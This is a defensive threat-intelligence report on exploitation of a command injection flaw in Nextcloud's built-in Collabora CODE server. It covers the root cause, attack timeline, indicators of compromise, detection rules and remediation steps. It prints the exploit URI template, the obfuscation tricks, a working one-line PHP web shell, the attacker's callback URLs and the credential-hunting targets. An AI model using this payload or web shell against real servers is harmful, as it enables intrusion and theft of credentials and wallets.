# Technical Analysis Report: Collabora Online CODE Server RCE Exploitation (CVE-2026-110447)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-10-16
Version: 2.0 (FINAL)
Revision: Applied critic review -- fixed Sigma Rule 1 field encoding (cs-uri-query to cs-uri-stem), removed service restriction, tightened base64 match; fixed Suricata SID 2026101602 to use http.uri.raw for encoded matching; fixed Suricata SID 2026101604 with correct webhook UUIDs and added SID 2026101605/2026101606; added /U flag to SID 2026101603 pcre; dropped YARA Rule 2 (redundant generic shell detector); downgraded Sigma Rule 4 confidence to MEDIUM.

## Executive Summary

CVE-2026-110447 is a critical unauthenticated OS command injection vulnerability (CWE-78) in the Collabora Online Built-in CODE Server app (`richdocumentscode`) for Nextcloud, versions prior to 26.4.303. The flaw resides in `proxy.php`, where user-controlled HTTP request data is embedded in a double-quoted bash command string used to start the bundled Collabora server process. When the CODE server is not running -- such as after a restart, upgrade, or crash -- an attacker can inject arbitrary shell commands via the URL path without authentication. Active exploitation was first observed on September 10, 2026. Attackers deployed one-line PHP web shells into the application directory, conducted system reconnaissance via webhook callbacks, and performed post-exploitation credential and cryptocurrency wallet discovery. The vulnerability carries a severity rating of 9.2/10 as assessed by the Nextcloud community. The fix was released on September 11, 2026, but the CVE and formal advisory were not published until October 14, 2026 -- over five weeks after the first attack.

## Background: Collabora Online and the Built-in CODE Server

Collabora Online is an open-source office suite that integrates with cloud storage platforms, most notably Nextcloud, to provide collaborative document editing. The "Built-in CODE Server" (`richdocumentscode`) is an optional Nextcloud app that bundles the Collabora Online Development Edition (CODE) as an AppImage, allowing administrators to run the entire collaboration stack on a single server without separate Docker or package installations. While convenient, this architecture means the Collabora server process is managed by PHP code running in the web server context, creating a direct pathway from web requests to OS-level process execution.

The built-in CODE server is distinct from standalone Collabora Online deployments (Docker, RPM/DEB packages, hosted services, and Nextcloud All-in-One), which are **not affected** by this vulnerability.

## Attack Timeline (UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-08-20 | Caolan McNamara commits fix: "tidy up how the coolwsd launch command is built" ([commit 6cc8dae](https://github.com/CollaboraOnline/richdocumentscode/commit/6cc8dae54c92bae27d53c54b9898cf1123ca2066)) |
| 2026-08-31 | Version 26.4.302 released (still vulnerable) |
| 2026-09-09 | Fix commit merged into release branch |
| 2026-09-10 19:51 (UTC+2) | First logged exploitation attempt from 139[.]28[.]18[.]122 |
| 2026-09-11 09:56 (UTC+2) | Second exploitation attempt from same IP; different web shell filename |
| 2026-09-11 | Version 26.4.303 released with the fix |
| 2026-09-14 19:04 (UTC+2) | Exploitation attempt from 89[.]38[.]98[.]50 against an already-patched server |
| 2026-09-18 | Victim reports failed sudo attempts from web server account |
| 2026-09-24 | Version 26.4.402 released with further hardening (startup regressions reported) |
| 2026-09-29 | Reports of ransomware operators leveraging the vulnerability |
| 2026-10-03 | [Community forum warning](https://help.nextcloud.com/t/to-collabora-built-in-user-update-asap/250516) urging immediate updates |
| 2026-10-14 | CVE-2026-110447, [GHSA-g3vx-3m76-fghh](https://github.com/CollaboraOnline/richdocumentscode/security/advisories/GHSA-g3vx-3m76-fghh), and [GHSA-f97p-r72q-64h2](https://github.com/advisories/GHSA-f97p-r72q-64h2) published |
| 2026-10-15 | [Collabora blog post](https://collaboraonline.com/blog/stay-safe-upgrade-everything-regularly/) and media coverage |

## Root Cause: Unescaped Shell Command Construction in proxy.php

The vulnerability exists in the `startCoolwsd()` function within `apps/richdocumentscode/proxy.php`. The vulnerable code constructs a bash command by interpolating PHP variables -- including data derived from the HTTP request -- inside a double-quoted string passed to `bash -c`:

**Vulnerable code:**
```php
$launchCmd = "bash -c \"( $appImage $remoteFontConfig $IPv4only $lok_allow --pidfile=$pidfile || $appImage --appimage-extract-and-run $remoteFontConfig $IPv4only $lok_allow --pidfile=$pidfile) >/dev/null & disown\"";
```

While individual variables like `$lok_allow` (which includes `$_SERVER['HTTP_HOST']`) are processed through `escapeshellarg()`, the single-quote escaping produced by that function is neutralized within the outer double-quoted string. Bash expands `$(...)` and backtick command substitutions inside double quotes regardless of embedded single quotes. The script is a standalone PHP file that does not load the Nextcloud framework, and it only executes this launch command when the CODE server process is not running.

**Fixed code:**
```php
$innerCmd = "( $appImage $remoteFontConfig $IPv4only $lok_allow --pidfile=$pidfile || $appImage --appimage-extract-and-run $remoteFontConfig $IPv4only $lok_allow --pidfile=$pidfile) >/dev/null & disown";
$launchCmd = "bash -c " . escapeshellarg($innerCmd);
```

The fix passes the entire inner command as a single `escapeshellarg()`-protected argument to `bash -c`, preventing shell metacharacter expansion of user-controlled data.

## Technical Analysis of Exploitation

### 1. Exploitation Vector

The attack is delivered as an HTTP GET request to the proxy.php endpoint with shell command substitution injected into the URL path:

```
GET /x$(PAYLOAD)x/%2e%2e/apps/richdocumentscode/proxy.php?status HTTP/1.1
```

**Observed obfuscation techniques:**
- Shell command substitution: `$(...)`
- URL-encoded path traversal: `%2e%2e` (for `..`)
- URL-encoded dollar sign: `%24%28` (for `$(`)
- IFS variable for whitespace: `${IFS}` or `%24%7BIFS%7D`
- Base64 encoding piped to shell: `base64${IFS}-d|sh`
- Spoofed User-Agent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0`

**Precondition:** The CODE server must be stopped (e.g., after a container restart, system reboot, Nextcloud upgrade, or crash). The proxy.php script only builds and executes the launch command when the server is not running. No authentication or user interaction is required.

### 2. Web Shell Deployment

The decoded payloads write a compact PHP web shell into the richdocumentscode application directory:

```php
<?php $c=$_GET['c']??'id'; echo shell_exec($c.' 2>&1');
```

This one-liner accepts a command parameter `c` via GET, defaults to `id` if no parameter is provided, and returns command output including stderr. The web shell is accessed at:

```
GET /apps/richdocumentscode/shx<hex>.php?c=<command> HTTP/1.1
```

### 3. Post-Exploitation Reconnaissance

After web shell deployment, the attacker:

1. **Beacons out:** Sends `uname -a` output to `webhook[.]site` callback URLs for system fingerprinting
2. **Credential hunting:** Searches for password manager databases and cryptocurrency wallet files:
   - KeePass databases: `*.kdbx`
   - Bitcoin wallets: `wallet.dat`, `.bitcoin`
   - Ethereum: `keystore.json`, `.ethereum`
   - Other crypto: `.electrum`, `.monero`
   - Password managers: `bitwarden`, `1password`
3. **Privilege probing:** Failed sudo attempts were observed on at least one victim server

No data exfiltration was directly confirmed in reviewed logs, though the attacker had read access to everything the web server user (`www-data`) could access.

### 4. Process Artifacts

On the September 14 attempt against a patched server, the attacker's payload was embedded in the CODE server startup options, creating observable process artifacts:

- **AppImage path:** `/var/www/nextcloud/apps/richdocumentscode/collabora/Collabora_Online.AppImage`
- **Temp directories:** `/tmp/appimage_extracted_<hash>/`, `/tmp/coolwsd.<random>/`
- **Processes:** `coolwsd` (port 9983), `coolforkit-ns`
- **PID file:** `/tmp/coolwsd.pid`
- **Injected parameter:** `--o:remote_font_config.url=https://<attacker-domain>/x$(...)`

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All network IOCs use defanged notation: `[.]` replacing dots in domains/IPs.

### Network

| Type | Value | Context |
|------|-------|---------|
| IP | 139[.]28[.]18[.]122 | Attacker IP -- September 10-11 exploitation |
| IP | 89[.]38[.]98[.]50 | Attacker IP -- September 14 attempt |
| Domain | webhook[.]site | Callback/exfil service used for system fingerprinting |
| URL | `webhook[.]site/45060ed4-de0b-4119-8f0d-2a2776bbd413` | Callback UUID #1 |
| URL | `webhook[.]site/774cf5e1-b5a4-4174-a1ad-0241861029a2` | Callback UUID #2 |
| URI | `/apps/richdocumentscode/proxy.php?status` | Exploit target endpoint |
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0` | Spoofed UA observed in attacks |

### File System

| Indicator | Value | Context |
|-----------|-------|---------|
| File | `shrf4645.php` | Web shell in `/apps/richdocumentscode/` |
| File | `shxa35d0.php` | Web shell in `/apps/richdocumentscode/` |
| File | `shx5cf91.php` | Web shell in `/apps/richdocumentscode/` |
| File | `shxd33ce.php` | Web shell in `/apps/richdocumentscode/` |
| File | `shxf4645.php` | Web shell in `/apps/richdocumentscode/` |
| File | `shx13a86.php` | Web shell (second victim) |
| File | `shx56367.php` | Web shell (September 14 attempt, file not created) |
| SHA-256 | `4b9fbd0663fbfd6028fc216ed18e0d6ef3ae498a7fdc97083e4b0ce3cec40562` | One-line PHP web shell |
| Pattern | `sh[rx][a-f0-9]{4,5}\.php` | Web shell filename regex |
| Content | `<?php $c=$_GET['c']??'id'; echo shell_exec($c.' 2>&1');` | Web shell body |

### Behavioral

- HTTP requests to `/apps/richdocumentscode/proxy.php` containing `$(`, `%24%28`, `${IFS}`, or `base64` in the URI path
- New `.php` files created in the `apps/richdocumentscode/` directory matching the `shx*.php` or `shrf*.php` pattern
- Web server process (`www-data`) executing `find` commands searching for `.kdbx`, `wallet.dat`, or cryptocurrency directory names
- Outbound HTTP connections from the Nextcloud server to `webhook[.]site`
- `coolwsd` process started with command injection artifacts in `--o:remote_font_config.url` parameter

## MITRE ATT&CK Mapping

| Technique ID | Name | Context |
|-------------|------|---------|
| T1190 | Exploit Public-Facing Application | Unauthenticated command injection via proxy.php |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | Shell command execution via `$(...)` substitution and `base64 -d \| sh` |
| T1505.003 | Server Software Component: Web Shell | PHP web shell deployment for persistent access |
| T1082 | System Information Discovery | `uname -a` execution and callback to webhook.site |
| T1083 | File and Directory Discovery | `find` searches for credential stores and crypto wallets |
| T1552.001 | Unsecured Credentials: Credentials In Files | Targeted search for `.kdbx`, wallet files, password manager data |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTP callback to webhook.site for data exfiltration |

## Viability Assessment

This threat provides **high-confidence detection artifacts**:
- **Known web shell hash:** SHA-256 `4b9fbd0663fbfd6028fc216ed18e0d6ef3ae498a7fdc97083e4b0ce3cec40562` with exact content match
- **Consistent filename pattern:** All observed web shells follow `sh[rx][a-f0-9]{4,5}.php` naming
- **Fixed filesystem location:** Web shells are dropped in the `apps/richdocumentscode/` directory
- **Distinctive exploit URI:** Command injection markers (`$(`, `${IFS}`, `base64`) in requests to `proxy.php?status`
- **Known attacker IPs and callback infrastructure:** Two IPs and two webhook.site UUIDs observed

## Detection Rules

### Sigma Rules

#### Rule 1: Collabora Online CODE Server proxy.php Command Injection Exploit Attempt

```yaml
title: Collabora Online CODE Server proxy.php Command Injection Exploit Attempt
id: 7e3c2a91-4f8b-4d6e-b1a3-c9e7f5d82b14
status: experimental
description: Detects HTTP requests targeting the Collabora Online Built-in CODE Server proxy.php endpoint with command injection patterns, indicating exploitation of CVE-2026-110447.
references:
    - https://www.bleepingcomputer.com/news/security/hackers-exploit-collabora-rce-flaw-to-backdoor-nextcloud-servers/
    - https://thehackernews.com/2026/10/hackers-backdoor-nextcloud-servers.html
    - https://github.com/CollaboraOnline/richdocumentscode/issues/354
    - https://github.com/CollaboraOnline/richdocumentscode/security/advisories/GHSA-g3vx-3m76-fghh
author: Actioner
date: 2026/10/16
tags:
    - attack.t1190
    - attack.t1059.004
    - cve.2026.110447
logsource:
    category: webserver
detection:
    selection_uri:
        cs-uri-stem|contains: 'proxy.php'
    selection_app_path:
        cs-uri-stem|contains: '/richdocumentscode/'
    selection_injection_high:
        cs-uri-stem|contains:
            - '$('
            - '%24%28'
            - '${IFS}'
            - '%24%7BIFS%7D'
            - '%2e%2e'
    selection_injection_base64:
        cs-uri-stem|contains: 'base64${IFS}'
    condition: selection_uri and selection_app_path and (selection_injection_high or selection_injection_base64)
falsepositives:
    - Legitimate use of encoded path segments in the Collabora proxy URL is uncommon but possible in misconfigured setups
level: critical
```

- **Compile status:** PASS (sigma convert + yamlload successful)
- **Confidence:** HIGH -- detects the exact exploit URI pattern documented in multiple victim reports

#### Rule 2: Collabora CODE Server Web Shell File Creation

```yaml
title: Collabora CODE Server Web Shell File Creation
id: a2d41f73-9b5e-4c82-8d1f-e6b7a3f09c45
status: experimental
description: Detects creation of PHP web shell files matching the naming pattern observed in CVE-2026-110447 exploitation (shx*.php or shrf*.php) within the richdocumentscode app directory.
references:
    - https://www.bleepingcomputer.com/news/security/hackers-exploit-collabora-rce-flaw-to-backdoor-nextcloud-servers/
    - https://thehackernews.com/2026/10/hackers-backdoor-nextcloud-servers.html
    - https://github.com/CollaboraOnline/richdocumentscode/issues/354
author: Actioner
date: 2026/10/16
tags:
    - attack.t1505.003
logsource:
    category: file_event
    product: linux
detection:
    selection_path:
        TargetFilename|contains: '/richdocumentscode/'
    selection_filename:
        TargetFilename|endswith:
            - 'shrf4645.php'
            - 'shxa35d0.php'
            - 'shx5cf91.php'
            - 'shxd33ce.php'
            - 'shxf4645.php'
            - 'shx13a86.php'
            - 'shx56367.php'
    selection_pattern:
        TargetFilename|re: '/sh[rx][a-f0-9]{4,5}\.php$'
    condition: selection_path and (selection_filename or selection_pattern)
falsepositives:
    - Legitimate Collabora app updates creating files with similar naming patterns (unlikely)
level: critical
```

- **Compile status:** PASS (sigma convert successful)
- **Confidence:** HIGH -- exact filenames from incident reports plus pattern match for variants

#### Rule 3: Collabora CODE Server Web Shell HTTP Access

```yaml
title: Collabora CODE Server Web Shell HTTP Access
id: c8f56d12-3e7a-4b91-a5c0-d94e82f17b63
status: experimental
description: Detects HTTP requests to known web shell filenames dropped during CVE-2026-110447 exploitation in the richdocumentscode application directory.
references:
    - https://www.bleepingcomputer.com/news/security/hackers-exploit-collabora-rce-flaw-to-backdoor-nextcloud-servers/
    - https://thehackernews.com/2026/10/hackers-backdoor-nextcloud-servers.html
    - https://github.com/CollaboraOnline/richdocumentscode/issues/354
author: Actioner
date: 2026/10/16
tags:
    - attack.t1505.003
logsource:
    category: webserver
detection:
    selection_path:
        cs-uri-stem|contains: '/richdocumentscode/'
    selection_shell:
        cs-uri-stem|re: '/sh[rx][a-f0-9]{4,5}\.php'
    selection_param:
        cs-uri-query|contains: 'c='
    condition: selection_path and selection_shell and selection_param
falsepositives:
    - Extremely unlikely in normal Nextcloud operations
level: critical
```

- **Compile status:** PASS (sigma convert successful)
- **Confidence:** HIGH -- correlates directory path, filename pattern, and command parameter

#### Rule 4: Credential and Cryptocurrency Wallet Discovery via Web Shell

```yaml
title: Credential and Cryptocurrency Wallet Discovery via Web Shell
id: f4a91b28-7c3d-4e56-9d82-b1c5e7a36f90
status: experimental
description: Detects process execution patterns consistent with post-exploitation credential and cryptocurrency wallet discovery observed after CVE-2026-110447 exploitation on Nextcloud servers.
references:
    - https://www.bleepingcomputer.com/news/security/hackers-exploit-collabora-rce-flaw-to-backdoor-nextcloud-servers/
    - https://thehackernews.com/2026/10/hackers-backdoor-nextcloud-servers.html
    - https://github.com/CollaboraOnline/richdocumentscode/issues/354
author: Actioner
date: 2026/10/16
tags:
    - attack.t1083
    - attack.t1552.001
logsource:
    category: process_creation
    product: linux
detection:
    selection_parent:
        ParentImage|endswith:
            - '/apache2'
            - '/httpd'
            - '/nginx'
            - '/php-fpm'
            - '/php-cgi'
            - '/php'
    selection_find:
        Image|endswith: '/find'
        CommandLine|contains:
            - '.kdbx'
            - 'wallet.dat'
            - 'keystore.json'
            - '.bitcoin'
            - '.electrum'
            - '.monero'
            - '.ethereum'
            - 'bitwarden'
            - '1password'
    condition: selection_parent and selection_find
falsepositives:
    - Legitimate administrative searches for credential databases from web server context (very unlikely)
level: medium
```

- **Compile status:** PASS (sigma convert successful)
- **Confidence:** MEDIUM -- campaign-observed TTP; specific parent-child process relationship with distinctive search targets, but not CVE-specific

### Suricata Rules

```
# Detect exploitation attempt via proxy.php with command injection (decoded form)
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET EXPLOIT Collabora CODE Server proxy.php Command Injection Attempt (CVE-2026-110447)"; flow:established,to_server; http.uri; content:"/richdocumentscode/"; content:"proxy.php"; distance:0; content:"$("; sid:2026101601; rev:1; metadata:affected_product Collabora_Online_CODE_Server, attack_target Server, created_at 2026_10_16, cve CVE_2026_110447, deployment Perimeter, tag Exploit; reference:cve,2026-110447; reference:url,github.com/CollaboraOnline/richdocumentscode/issues/354; classtype:web-application-attack; priority:1;)

# Detect exploitation attempt with URL-encoded command substitution (raw URI)
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET EXPLOIT Collabora CODE Server proxy.php URL-Encoded Command Injection (CVE-2026-110447)"; flow:established,to_server; http.uri.raw; content:"/richdocumentscode/"; content:"proxy.php"; distance:0; content:"%24%28"; sid:2026101602; rev:2; metadata:affected_product Collabora_Online_CODE_Server, attack_target Server, created_at 2026_10_16, cve CVE_2026_110447, deployment Perimeter, tag Exploit; reference:cve,2026-110447; classtype:web-application-attack; priority:1;)

# Detect access to known web shell filenames in richdocumentscode directory
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET TROJAN Collabora CODE Server Web Shell Access (CVE-2026-110447)"; flow:established,to_server; http.uri; content:"/richdocumentscode/"; pcre:"/\/sh[rx][a-f0-9]{4,5}\.php/U"; sid:2026101603; rev:2; metadata:affected_product Collabora_Online_CODE_Server, attack_target Server, created_at 2026_10_16, cve CVE_2026_110447, deployment Perimeter, tag WebShell; reference:cve,2026-110447; classtype:web-application-attack; priority:1;)

# Detect callback to webhook.site UUID #1 (post-exploitation beacon)
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET TROJAN Collabora CODE Exploitation Callback to webhook.site (CVE-2026-110447)"; flow:established,to_server; http.host; content:"webhook.site"; http.uri; content:"/45060ed4-de0b-4119-8f0d-2a2776bbd413"; sid:2026101604; rev:2; metadata:affected_product Collabora_Online_CODE_Server, attack_target Server, created_at 2026_10_16, cve CVE_2026_110447, deployment Perimeter, tag C2; reference:cve,2026-110447; classtype:trojan-activity; priority:2;)

# Detect callback to webhook.site UUID #2 (post-exploitation beacon)
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET TROJAN Collabora CODE Exploitation Callback to webhook.site UUID2 (CVE-2026-110447)"; flow:established,to_server; http.host; content:"webhook.site"; http.uri; content:"/774cf5e1-b5a4-4174-a1ad-0241861029a2"; sid:2026101605; rev:1; metadata:affected_product Collabora_Online_CODE_Server, attack_target Server, created_at 2026_10_16, cve CVE_2026_110447, deployment Perimeter, tag C2; reference:cve,2026-110447; classtype:trojan-activity; priority:2;)

# Generic webhook.site callback from HOME_NET (lower confidence, broader coverage)
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET POLICY Outbound HTTP to webhook.site from HOME_NET (Possible Post-Exploitation Beacon)"; flow:established,to_server; http.host; content:"webhook.site"; threshold:type limit, track by_src, count 1, seconds 300; sid:2026101606; rev:1; metadata:affected_product Any, attack_target Server, created_at 2026_10_16, deployment Perimeter, tag C2; classtype:policy-violation; priority:3;)
```

- **Compile status:** NOT VALIDATED (suricata binary not available in environment; rules follow ET syntax conventions)
- **Confidence:** HIGH for SIDs 2026101601-2026101603 (exploit and web shell access patterns); HIGH for SIDs 2026101604-2026101605 (exact observed callback UUIDs); LOW for SID 2026101606 (generic webhook.site -- high false-positive potential)

### YARA Rules

```yara
rule Collabora_CODE_WebShell_CVE_2026_110447 {
    meta:
        description = "Detects the PHP web shell dropped during exploitation of CVE-2026-110447 in the Collabora Online Built-in CODE Server for Nextcloud"
        author = "Actioner"
        date = "2026-10-16"
        reference = "https://github.com/CollaboraOnline/richdocumentscode/issues/354"
        hash = "4b9fbd0663fbfd6028fc216ed18e0d6ef3ae498a7fdc97083e4b0ce3cec40562"
        severity = "critical"

    strings:
        $exact_shell = "<?php $c=$_GET['c']??'id'; echo shell_exec($c.' 2>&1');" ascii
        $var_get = "$_GET['c']" ascii
        $shell_exec = "shell_exec(" ascii
        $default_id = "??'id'" ascii
        $stderr_redirect = "2>&1" ascii

    condition:
        $exact_shell or
        (filesize < 200 and $var_get and $shell_exec and $default_id) or
        (filesize < 200 and $shell_exec and $stderr_redirect and $var_get)
}
```

> **Note:** YARA Rule 2 (`Collabora_CODE_WebShell_Filename_Pattern`) from v1.0 was DROPPED during review. It was a generic small PHP shell detector that did not inspect filenames despite its title, and its detection surface is already covered by Rule 1 above.

- **Compile status:** PASS (yarac compilation successful, 0 errors)
- **Confidence:** HIGH for `Collabora_CODE_WebShell_CVE_2026_110447` (exact hash and content match)

## Remediation

1. **Upgrade immediately:** Update `richdocumentscode` to version 26.4.303 or later. Version 26.4.402 includes additional hardening but has reported startup regressions; 26.4.303 is the minimum safe version.
2. **Remove if unnecessary:** If the built-in CODE server is not needed, remove the app entirely. Disabling the app is **not sufficient** -- `proxy.php` remains accessible.
3. **Nextcloud 29 and older:** These are end-of-life and cannot install 26.4.303. Upgrade Nextcloud to version 30+ or remove the `richdocumentscode` app.
4. **Web shell sweep:** Search for and remove any `shx*.php` or `shrf*.php` files under `apps/richdocumentscode/` and elsewhere in the web root.
5. **Log review:** Examine web server access logs from September 10, 2026 onward for:
   - Requests to `proxy.php?status` with `$(`, `%24%28`, `${IFS}`, or `base64` in the URI
   - Requests to any `shx*.php` or `shrf*.php` files
   - Connections from 139[.]28[.]18[.]122 or 89[.]38[.]98[.]50
6. **Credential rotation:** Rotate all credentials accessible to the web server user, especially password manager databases and cryptocurrency wallet material.
7. **Monitor for variants:** The vulnerability class (shell injection via request data in process launch) could apply to similar patterns in other PHP applications that exec shell commands.

## Related Vulnerabilities

- **CVE-2025-66208:** A prior command injection flaw in the same `proxy.php` script, disclosed December 2025 (advisory [GHSA-j3q6-q5pc-v5wf](https://github.com/advisories/GHSA-j3q6-q5pc-v5wf)). Its fix did not prevent the CVE-2026-110447 vulnerability.

## References

- [BleepingComputer: Hackers exploit Collabora RCE flaw to backdoor Nextcloud servers](https://www.bleepingcomputer.com/news/security/hackers-exploit-collabora-rce-flaw-to-backdoor-nextcloud-servers/)
- [The Hacker News: Hackers Backdoor Nextcloud Servers](https://thehackernews.com/2026/10/hackers-backdoor-nextcloud-servers.html)
- [GitHub Issue #354: Web shells discovered on richdocumentscode servers](https://github.com/CollaboraOnline/richdocumentscode/issues/354)
- [GHSA-g3vx-3m76-fghh: Collabora Online security advisory](https://github.com/CollaboraOnline/richdocumentscode/security/advisories/GHSA-g3vx-3m76-fghh)
- [GHSA-f97p-r72q-64h2: GitHub global advisory](https://github.com/advisories/GHSA-f97p-r72q-64h2)
- [NVD: CVE-2026-110447](https://nvd.nist.gov/vuln/detail/cve-2026-110447)
- [Fix commit 6cc8dae](https://github.com/CollaboraOnline/richdocumentscode/commit/6cc8dae54c92bae27d53c54b9898cf1123ca2066)
- [Nextcloud community forum warning](https://help.nextcloud.com/t/to-collabora-built-in-user-update-asap/250516)
- [Collabora blog: Stay safe, upgrade everything regularly](https://collaboraonline.com/blog/stay-safe-upgrade-everything-regularly/)
- [EUVD-2026-100780](https://www.enisa.europa.eu/topics/csirts-in-europe/glossary/euvd)
- [The Patchless Window (Second Security study on CVE publication delays)](https://thepatchlesswindow.com)
